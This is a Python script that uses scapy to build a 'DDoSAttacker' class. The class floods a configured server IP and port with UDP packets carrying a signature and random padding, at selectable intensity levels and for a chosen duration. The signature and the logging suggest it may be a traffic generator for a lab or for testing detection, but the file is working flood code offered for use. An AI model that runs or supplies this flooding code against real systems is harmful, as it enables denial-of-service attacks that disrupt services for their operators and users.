from scapy.all import *
import random
import time
import logging
from datetime import datetime
from config import *

logging.basicConfig(
    filename='logs/attack_traffic.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

class DDoSAttacker:
    def __init__(self):
        self.signature = PACKET_SIGNATURE + "ATTACK_"
    
    def generate_attack_packet(self):
        # Generate random source port for attack
        sport = random.randint(1024, 65535)
        
        # Create packet with our signature
        seq_num = random.randint(1, 1000)
        payload = f"{self.signature}{seq_num}".encode() + b"X" * random.randint(64, 1024)
        
        return IP(dst=SERVER_IP)/\
               UDP(sport=sport, dport=ATTACK_TRAFFIC_PORT)/\
               Raw(load=payload)
    
    def start_attack(self, duration, intensity='medium'):
        end_time = time.time() + duration
        packets_sent = 0
        
        # Set delay based on intensity
        if intensity == 'low':
            delay = 0.01
        elif intensity == 'medium':
            delay = 0.005
        else:  # high
            delay = 0.001
        
        logging.info(f"Starting attack with {intensity} intensity")
        print(f"Attacking {SERVER_IP} with {intensity} intensity")
        
        while time.time() < end_time:
            try:
                pkt = self.generate_attack_packet()
                send(pkt, verbose=0)
                packets_sent += 1
                
                time.sleep(delay)
                
            except Exception as e:
                logging.error(f"Error: {str(e)}")
        
        logging.info(f"Attack completed. Sent {packets_sent} packets")
        print(f"Sent {packets_sent} packets")

if __name__ == "__main__":
    attacker = DDoSAttacker()
    duration = int(input("Enter attack duration in seconds: "))
    intensity = input("Enter intensity (low/medium/high): ").lower()
    attacker.start_attack(duration, intensity)